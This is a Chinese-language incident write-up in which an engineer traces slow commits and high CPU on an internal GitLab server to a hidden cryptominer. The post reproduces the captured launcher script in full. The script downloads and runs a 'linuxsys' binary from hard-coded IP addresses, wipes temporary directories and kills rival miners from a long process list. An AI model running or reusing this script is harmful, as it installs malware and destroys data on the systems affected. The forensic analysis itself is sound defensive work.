从2024年3月有同事反应git提交代码非常慢，架构组的同事立马排查，首先是查到cpu高的异常，于是重启了gitlab，重启后卡顿感消失了，但并没有从根本上解决问题，后面又出现了同样的情况。

架构同事的解决方案是将gitlab迁移，然后观察是否会出现同样的情况，有了方案后也按照方案迁移，但并不顺利，迁移后的git存在其他数据问题，后面便不了了之，每次提交如果卡顿就重启一遍。



![image-20240531101244670](C:\Users\Dell\AppData\Roaming\Typora\typora-user-images\image-20240531101244670.png)

![image-20240531101347739](C:\Users\Dell\AppData\Roaming\Typora\typora-user-images\image-20240531101347739.png)

![image-20240531101505338](C:\Users\Dell\AppData\Roaming\Typora\typora-user-images\image-20240531101505338.png)

直到4月7日的时候我开始着手排查问题。排查中我明白了，架构同事之所以没找到问题的根本，是因为这个问题有一定门槛，本来就是为了躲避排查。

第一点都能看到的是cpu异常的高，并且能够定位导致cpu高的进程，进程名也都知道，但是没人清楚这是什么，也找不到进程对应的文件（被删除了），所以棘手无策。

我进入gitlab容器，打印了该进程打开的文件，发现有一个socket连接国外的域名，解析是欧洲国家的ip，我用kill 9杀掉进程，进程仍然重启，重启后连接的国外ip有变动。

![image-20240531103542898](C:\Users\Dell\AppData\Roaming\Typora\typora-user-images\image-20240531103542898.png)

一番思考，问题的马脚已经抓住，内网的gitlab没有任何理由连接国外的什么服务，起初我只是以为这是一个代码仓库在拷贝公司代码。

使用网络手段禁止了与该ip的通信，cpu立刻下来了，能发现有一个进程在不断重启，因为连接不到该ip的服务，到这其实也算暂时把问题抑制住了，前提是不重启。

继续排查，虽然进程执行文件被删除了，仍然被我通过socket发送的信息抓到蛛丝马迹，我完整地把这个进程的启动脚本抓了下来

```
p=$(ps aux | grep -E 'linuxsys|jailshell' | grep -v grep | wc -l)
if [ ${p} -eq 1 ];then
    echo "Aya keneh proses. Tong waka nya!"
    # Kill All Process & Remove Files
    rm -rf /dev/shm/*; rm -rf /dev/shm/.*; rm -rf /tmp*; rm -rf /tmp/.*; rm -rf /var/tmp*; rm -rf /var/tmp/.*; rm -rf ~/config.json; rm -rf ~/linuxsys; rm -rf ./config.json; rm -rf ./linuxsys; rm -rf linuxsh; rm -rf linux.sh; rm -rf cronsh; rm -rf killersh; ps -ef | grep -v grep | grep -E '18.130.193.222|185.122.204.197|DMS|VIDMS|cms|clamd|PTS|PCPS|c3pool|screen|watchkid|wotchdog|watchhound|sleep|./zhudaj|./zyj24000|./zhuda|./LSHT|zhudaj|zyj24000|zhuda|LSHT|clinche|./WTF|confssh|bashirc|mysqldd|rodolf.sh|rodolf|sshexec|cnrig|attack|dovecat|javae|donate|scan\.log|xmr-stak|crond64|yespowersugar|/tmp/java|pastebin|/tmp/\.|/tmp/system|excludefile|agettyd|\./python|\./crun|\./\.|118/cf\.sh|/tmp/.UNIFI/.unifi.sh|\.6379|load\.sh|init\.sh|solr\.sh|\.rsyslogds|pnscan|masscan|kthreaddi|solrd|meminitsrv|networkservice|sysupdate|phpguard|phpupdate|networkmanager|knthread|mysqlserver|watchbog|zgrab|/dev/shm|/var/tmp|/tmp/*|/var/tmp/*|kik|hezb|kinsing|kdevtmpfsi|stratum|.zshrc|lb64|ld-linux-x86-64|iosk|205.147.101|/bin/sh ./*|./syslogd|./rcu|klogd|xmrig|/tmp/c3pool/xmrig|sysls|logo|logrunner|english|kthreaddk|./dir|./x|./clinche|./amd64|server.js|acpid|/tmp/.*|kthreaddo' | awk '{print $2}' | xargs -i kill -9 {} >/dev/null 2>&1

    exit
elif [ ${p} -eq 0 ];then
    echo "Sok bae ngalangkung weh!"
    # Execute linuxsys
    cd /var/tmp; curl -s http://140.206.42.202:88/formmode/apps/upload/ktree/images/config.json -o config.json || wget -q -O config.json http://140.206.42.202:88/formmode/apps/upload/ktree/images/config.json; curl -s http://140.206.42.202:88/formmode/apps/upload/ktree/images/linuxsys -o linuxsys || wget -q -O linuxsys http://140.206.42.202:88/formmode/apps/upload/ktree/images/linuxsys; chmod +x linuxsys; ./linuxsys
    # Kill All Process & Remove Files
    rm -rf /dev/shm/*; rm -rf /dev/shm/.*; rm -rf /tmp*; rm -rf /tmp/.*; rm -rf /var/tmp*; rm -rf /var/tmp/.*; rm -rf ~/config.json; rm -rf ~/linuxsys; rm -rf ./config.json; rm -rf ./linuxsys; rm -rf linuxsh; rm -rf linux.sh; rm -rf cronsh; rm -rf killersh; ps -ef | grep -v grep | grep -E '18.130.193.222|185.122.204.197|DMS|VIDMS|cms|clamd|PTS|PCPS|c3pool|screen|watchkid|wotchdog|watchhound|sleep|./zhudaj|./zyj24000|./zhuda|./LSHT|zhudaj|zyj24000|zhuda|LSHT|clinche|./WTF|confssh|bashirc|mysqldd|rodolf.sh|rodolf|sshexec|cnrig|attack|dovecat|javae|donate|scan\.log|xmr-stak|crond64|yespowersugar|/tmp/java|pastebin|/tmp/\.|/tmp/system|excludefile|agettyd|\./python|\./crun|\./\.|118/cf\.sh|/tmp/.UNIFI/.unifi.sh|\.6379|load\.sh|init\.sh|solr\.sh|\.rsyslogds|pnscan|masscan|kthreaddi|solrd|meminitsrv|networkservice|sysupdate|phpguard|phpupdate|networkmanager|knthread|mysqlserver|watchbog|zgrab|/dev/shm|/var/tmp|/tmp/*|/var/tmp/*|kik|hezb|kinsing|kdevtmpfsi|stratum|.zshrc|lb64|ld-linux-x86-64|iosk|205.147.101|/bin/sh ./*|./syslogd|./rcu|klogd|xmrig|/tmp/c3pool/xmrig|sysls|logo|logrunner|english|kthreaddk|./dir|./x|./clinche|./amd64|server.js|acpid|/tmp/.*|kthreaddo' | awk '{print $2}' | xargs -i kill -9 {} >/dev/null 2>&1

fi

p=$(ps aux | grep -E 'linuxsys|jailshell' | grep -v grep | wc -l)
if [ ${p} -eq 1 ];then
    echo "Aya keneh proses. Tong waka nya!"
    # Kill All Process & Remove Files
    rm -rf /dev/shm/*; rm -rf /dev/shm/.*; rm -rf /tmp*; rm -rf /tmp/.*; rm -rf /var/tmp*; rm -rf /var/tmp/.*; rm -rf ~/config.json; rm -rf ~/linuxsys; rm -rf ./config.json; rm -rf ./linuxsys; rm -rf linuxsh; rm -rf linux.sh; rm -rf cronsh; rm -rf killersh; ps -ef | grep -v grep | grep -E '18.130.193.222|185.122.204.197|DMS|VIDMS|cms|clamd|PTS|PCPS|c3pool|screen|watchkid|wotchdog|watchhound|sleep|./zhudaj|./zyj24000|./zhuda|./LSHT|zhudaj|zyj24000|zhuda|LSHT|clinche|./WTF|confssh|bashirc|mysqldd|rodolf.sh|rodolf|sshexec|cnrig|attack|dovecat|javae|donate|scan\.log|xmr-stak|crond64|yespowersugar|/tmp/java|pastebin|/tmp/\.|/tmp/system|excludefile|agettyd|\./python|\./crun|\./\.|118/cf\.sh|/tmp/.UNIFI/.unifi.sh|\.6379|load\.sh|init\.sh|solr\.sh|\.rsyslogds|pnscan|masscan|kthreaddi|solrd|meminitsrv|networkservice|sysupdate|phpguard|phpupdate|networkmanager|knthread|mysqlserver|watchbog|zgrab|/dev/shm|/var/tmp|/tmp/*|/var/tmp/*|kik|hezb|kinsing|kdevtmpfsi|stratum|.zshrc|lb64|ld-linux-x86-64|iosk|205.147.101|/bin/sh ./*|./syslogd|./rcu|klogd|xmrig|/tmp/c3pool/xmrig|sysls|logo|logrunner|english|kthreaddk|./dir|./x|./clinche|./amd64|server.js|acpid|/tmp/.*|kthreaddo' | awk '{print $2}' | xargs -i kill -9 {} >/dev/null 2>&1

    exit
elif [ ${p} -eq 0 ];then
    echo "Sok bae ngalangkung weh!"
    # Execute linuxsys
    cd /tmp; curl -s http://140.206.42.202:88/formmode/apps/upload/ktree/images/config.json -o config.json || wget -q -O config.json http://140.206.42.202:88/formmode/apps/upload/ktree/images/config.json; curl -s http://140.206.42.202:88/formmode/apps/upload/ktree/images/linuxsys -o linuxsys || wget -q -O linuxsys http://140.206.42.202:88/formmode/apps/upload/ktree/images/linuxsys; chmod +x linuxsys; ./linuxsys
    # Kill All Process & Remove Files
    rm -rf /dev/shm/*; rm -rf /dev/shm/.*; rm -rf /tmp*; rm -rf /tmp/.*; rm -rf /var/tmp*; rm -rf /var/tmp/.*; rm -rf ~/config.json; rm -rf ~/linuxsys; rm -rf ./config.json; rm -rf ./linuxsys; rm -rf linuxsh; rm -rf linux.sh; rm -rf cronsh; rm -rf killersh; ps -ef | grep -v grep | grep -E '18.130.193.222|185.122.204.197|DMS|VIDMS|cms|clamd|PTS|PCPS|c3pool|screen|watchkid|wotchdog|watchhound|sleep|./zhudaj|./zyj24000|./zhuda|./LSHT|zhudaj|zyj24000|zhuda|LSHT|clinche|./WTF|confssh|bashirc|mysqldd|rodolf.sh|rodolf|sshexec|cnrig|attack|dovecat|javae|donate|scan\.log|xmr-stak|crond64|yespowersugar|/tmp/java|pastebin|/tmp/\.|/tmp/system|excludefile|agettyd|\./python|\./crun|\./\.|118/cf\.sh|/tmp/.UNIFI/.unifi.sh|\.6379|load\.sh|init\.sh|solr\.sh|\.rsyslogds|pnscan|masscan|kthreaddi|solrd|meminitsrv|networkservice|sysupdate|phpguard|phpupdate|networkmanager|knthread|mysqlserver|watchbog|zgrab|/dev/shm|/var/tmp|/tmp/*|/var/tmp/*|kik|hezb|kinsing|kdevtmpfsi|stratum|.zshrc|lb64|ld-linux-x86-64|iosk|205.147.101|/bin/sh ./*|./syslogd|./rcu|klogd|xmrig|/tmp/c3pool/xmrig|sysls|logo|logrunner|english|kthreaddk|./dir|./x|./clinche|./amd64|server.js|acpid|/tmp/.*|kthreaddo' | awk '{print $2}' | xargs -i kill -9 {} >/dev/null 2>&1

fi

p=$(ps aux | grep -E 'linuxsys|jailshell' | grep -v grep | wc -l)
if [ ${p} -eq 1 ];then
    echo "Aya keneh proses. Tong waka nya!"
    # Kill All Process & Remove Files
    rm -rf /dev/shm/*; rm -rf /dev/shm/.*; rm -rf /tmp*; rm -rf /tmp/.*; rm -rf /var/tmp*; rm -rf /var/tmp/.*; rm -rf ~/config.json; rm -rf ~/linuxsys; rm -rf ./config.json; rm -rf ./linuxsys; rm -rf linuxsh; rm -rf linux.sh; rm -rf cronsh; rm -rf killersh; ps -ef | grep -v grep | grep -E '18.130.193.222|185.122.204.197|DMS|VIDMS|cms|clamd|PTS|PCPS|c3pool|screen|watchkid|wotchdog|watchhound|sleep|./zhudaj|./zyj24000|./zhuda|./LSHT|zhudaj|zyj24000|zhuda|LSHT|clinche|./WTF|confssh|bashirc|mysqldd|rodolf.sh|rodolf|sshexec|cnrig|attack|dovecat|javae|donate|scan\.log|xmr-stak|crond64|yespowersugar|/tmp/java|pastebin|/tmp/\.|/tmp/system|excludefile|agettyd|\./python|\./crun|\./\.|118/cf\.sh|/tmp/.UNIFI/.unifi.sh|\.6379|load\.sh|init\.sh|solr\.sh|\.rsyslogds|pnscan|masscan|kthreaddi|solrd|meminitsrv|networkservice|sysupdate|phpguard|phpupdate|networkmanager|knthread|mysqlserver|watchbog|zgrab|/dev/shm|/var/tmp|/tmp/*|/var/tmp/*|kik|hezb|kinsing|kdevtmpfsi|stratum|.zshrc|lb64|ld-linux-x86-64|iosk|205.147.101|/bin/sh ./*|./syslogd|./rcu|klogd|xmrig|/tmp/c3pool/xmrig|sysls|logo|logrunner|english|kthreaddk|./dir|./x|./clinche|./amd64|server.js|acpid|/tmp/.*|kthreaddo' | awk '{print $2}' | xargs -i kill -9 {} >/dev/null 2>&1

    exit
elif [ ${p} -eq 0 ];then
    echo "Sok bae ngalangkung weh!"
    # Execute linuxsys
    cd ~/; curl -s http://132.148.235.237/wp-content/config.json -o config.json || wget -q -O config.json http://132.148.235.237/wp-content/config.json; curl -s http://132.148.235.237/wp-content/linuxsys -o linuxsys || wget -q -O linuxsys http://132.148.235.237/wp-content/linuxsys; chmod +x linuxsys; ./linuxsys
    # Kill All Process & Remove Files
    rm -rf /dev/shm/*; rm -rf /dev/shm/.*; rm -rf /tmp*; rm -rf /tmp/.*; rm -rf /var/tmp*; rm -rf /var/tmp/.*; rm -rf ~/config.json; rm -rf ~/linuxsys; rm -rf ./config.json; rm -rf ./linuxsys; rm -rf linuxsh; rm -rf linux.sh; rm -rf cronsh; rm -rf killersh; ps -ef | grep -v grep | grep -E '18.130.193.222|185.122.204.197|DMS|VIDMS|cms|clamd|PTS|PCPS|c3pool|screen|watchkid|wotchdog|watchhound|sleep|./zhudaj|./zyj24000|./zhuda|./LSHT|zhudaj|zyj24000|zhuda|LSHT|clinche|./WTF|confssh|bashirc|mysqldd|rodolf.sh|rodolf|sshexec|cnrig|attack|dovecat|javae|donate|scan\.log|xmr-stak|crond64|yespowersugar|/tmp/java|pastebin|/tmp/\.|/tmp/system|excludefile|agettyd|\./python|\./crun|\./\.|118/cf\.sh|/tmp/.UNIFI/.unifi.sh|\.6379|load\.sh|init\.sh|solr\.sh|\.rsyslogds|pnscan|masscan|kthreaddi|solrd|meminitsrv|networkservice|sysupdate|phpguard|phpupdate|networkmanager|knthread|mysqlserver|watchbog|zgrab|/dev/shm|/var/tmp|/tmp/*|/var/tmp/*|kik|hezb|kinsing|kdevtmpfsi|stratum|.zshrc|lb64|ld-linux-x86-64|iosk|205.147.101|/bin/sh ./*|./syslogd|./rcu|klogd|xmrig|/tmp/c3pool/xmrig|sysls|logo|logrunner|english|kthreaddk|./dir|./x|./clinche|./amd64|server.js|acpid|/tmp/.*|kthreaddo' | awk '{print $2}' | xargs -i kill -9 {} >/dev/null 2>&1
```

从这份脚本中我直到了病毒进程是如何启动的，以及抓住了其中一个配置的来源ip，来自上海，也包括病毒进程文件的公网地址，我用windos将linuxsys下载下来，360立马提醒了我病毒类型，至此所有问题来源算是已经排查完毕。

接下来解决方案很简单，这里不过多赘述



![image-20240531102136697](C:\Users\Dell\AppData\Roaming\Typora\typora-user-images\image-20240531102136697.png)



